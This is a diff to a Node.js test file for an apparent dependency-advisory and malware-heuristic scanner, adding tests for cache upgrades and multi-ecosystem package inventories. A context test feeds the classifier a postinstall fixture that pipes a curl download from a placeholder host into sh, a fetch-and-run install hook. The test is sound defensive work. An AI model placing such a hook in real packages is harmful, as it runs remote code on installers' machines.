@@ -1,5 +1,5 @@
 import assert from 'node:assert/strict'
-import {mkdirSync, mkdtempSync, rmSync, writeFileSync} from 'node:fs'
+import {mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync} from 'node:fs'
 import {tmpdir} from 'node:os'
 import {join} from 'node:path'
 import test from 'node:test'
@@ -126,6 +126,29 @@ test('missing, stale, and inventory-mismatched caches cannot produce a clean zer
   }
 })
 
+test('an Online refresh upgrades a legacy cache without metadata', () => {
+  const root = makeRepository()
+  const storePath = join(root, '.legacy-advisories.json')
+  try {
+    writeFileSync(storePath, JSON.stringify({records: {}}))
+    const inventory = collectPackageInventory(root)
+    const result = commitAdvisoryRefresh({
+      plan: createAdvisoryQueryPlan(inventory),
+      idsByPackage: [[]],
+      queriedOk: 1,
+      repoKey: root,
+      inventoryCoverage: inventory.coverage,
+      storePath,
+    })
+    assert.equal(result.status, 'COMPLETE')
+    const upgraded = JSON.parse(readFileSync(storePath, 'utf8'))
+    assert.equal(upgraded.schema, 'weavatrix-online.advisories.v1')
+    assert.equal(upgraded.meta.repos[root].status, 'COMPLETE')
+  } finally {
+    rmSync(root, {recursive: true, force: true})
+  }
+})
+
 test('explicit malware scan reports bounded heuristic evidence, never a compromise verdict', () => {
   const root = mkdtempSync(join(tmpdir(), 'weavatrix-online-malware-'))
   const suspicious = join(root, 'node_modules', 'review-me')
@@ -165,4 +188,46 @@ test('lifecycle classifier requires download and execution to co-occur', () => {
   assert.equal(classifyLifecycleScripts({postinstall: 'node scripts/build.js'}).length, 0)
   assert.equal(classifyLifecycleScripts({postinstall: 'curl https://example.invalid/payload'}).length, 0)
   assert.equal(classifyLifecycleScripts({postinstall: 'curl https://example.invalid/payload | sh'}).length, 1)
+})
+
+test('inventory preserves exact coordinates across all documented OSV ecosystems', () => {
+  const root = mkdtempSync(join(tmpdir(), 'weavatrix-online-inventory-'))
+  try {
+    writeFileSync(join(root, 'package-lock.json'), JSON.stringify({
+      lockfileVersion: 3,
+      packages: {'node_modules/npm-fixture': {version: '1.2.3'}},
+    }))
+    writeFileSync(join(root, 'requirements.txt'), 'Django==5.2.1\n')
+    writeFileSync(join(root, 'go.sum'), 'example.com/go-fixture v1.4.0 h1:fixture\n')
+    writeFileSync(join(root, 'Cargo.lock'), [
+      'version = 4',
+      '[[package]]',
+      'name = "rust-fixture"',
+      'version = "0.8.2"',
+    ].join('\n'))
+    writeFileSync(join(root, 'pom.xml'), [
+      '<project><dependencies><dependency>',
+      '<groupId>com.example</groupId>',
+      '<artifactId>maven-fixture</artifactId>',
+      '<version>3.0.0</version>',
+      '</dependency></dependencies></project>',
+    ].join(''))
+
+    const inventory = collectPackageInventory(root)
+    assert.equal(inventory.coverage.state, 'COMPLETE')
+    assert.deepEqual(
+      inventory.packages
+        .map(({ecosystem, name, version}) => [ecosystem, name, version])
+        .sort((left, right) => left.join('|').localeCompare(right.join('|'))),
+      [
+        ['Go', 'example.com/go-fixture', '1.4.0'],
+        ['Maven', 'com.example:maven-fixture', '3.0.0'],
+        ['PyPI', 'django', '5.2.1'],
+        ['crates.io', 'rust-fixture', '0.8.2'],
+        ['npm', 'npm-fixture', '1.2.3'],
+      ].sort((left, right) => left.join('|').localeCompare(right.join('|'))),
+    )
+  } finally {
+    rmSync(root, {recursive: true, force: true})
+  }
 })
